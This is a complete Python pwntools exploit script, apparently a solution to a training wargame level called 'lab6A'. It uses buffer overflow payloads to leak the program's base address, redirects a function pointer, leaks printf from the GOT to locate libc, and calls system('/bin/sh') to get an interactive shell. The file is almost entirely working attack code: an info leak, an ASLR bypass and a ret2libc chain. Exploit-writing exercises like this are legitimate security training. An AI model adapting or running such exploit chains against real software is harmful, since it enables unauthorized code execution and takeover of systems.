from time import sleep

from pwn import *

O_MAKE_NOTE  = 0x9af
O_PRINT_NAME = 0x0be2

O_SYSTEM = 0x3e430

def leak_base(p):

    payload = ""
    payload += "B" * (128 - 32 - 6)
    payload += p32(O_PRINT_NAME)

    p.sendlineafter("Enter Choice: ", "1")
    p.sendafter("Enter your name: ", "A" * 32)
    p.sendafter("Enter your description: ", payload)

    p.sendlineafter("Enter Choice: ", "3")
    time.sleep(0.3)

    if p.poll() is None:

        p.recvuntil("is a ")
        p.recv(128 - 32 - 6)

        base = u32(p.recv(4)) - O_PRINT_NAME

        return base

    return 0

def call_makenote(p, base):

    payload = ""
    payload += "A" * 2
    payload += p32(base + O_MAKE_NOTE)

    p.sendlineafter("Enter Choice: ", "1")
    p.sendafter("Enter your name: ", "A" * 32)
    p.sendafter("Enter your description: ", payload)

    p.sendlineafter("Enter Choice: ", "4")

def leak_libc_base(p, base):

    payload = "A" * 52
    payload += p32(base + O_PRINT_NAME)
    payload += p32(base + O_MAKE_NOTE)
    payload += p32(base + 0x3010)

    p.sendline(payload)

    p.recvuntil("Username: ")
    got_printf = u32(p.recvline()[:4])

    log.info("printf at: " + hex(got_printf))

    libc_base = got_printf - 0x4d440

    return libc_base

def store_binsh(p):

    p.sendlineafter("Enter Choice: ", "2")
    p.sendlineafter("Enter your item's name: ", "/bin/sh")
    p.sendlineafter("Enter your item's price: ", "/bin/sh")

def gib_shell(p, base, base_libc):

    payload = "A" * 52
    payload += p32(base_libc + O_SYSTEM)
    payload += p32(base + 0x3140)
    payload += p32(base + 0x3140)
    payload += p32(base + 0x3140)
    payload += p32(base + 0x3140)
    payload += p32(base + 0x3140)

    p.sendline(payload)

base = 0
while base == 0:

    p = process("./lab6A")
    base = leak_base(p)
    if base: log.success("Base of binary: " + hex(base))


store_binsh(p)
call_makenote(p, base)
base_libc = leak_libc_base(p, base)
log.success("libc at: " + hex(base_libc))
log.success("system at: " + hex(base_libc + O_SYSTEM))
#gdb.attach(p, '''break system
#                continue
#''')
#raw_input()
gib_shell(p, base, base_libc)

p.interactive()
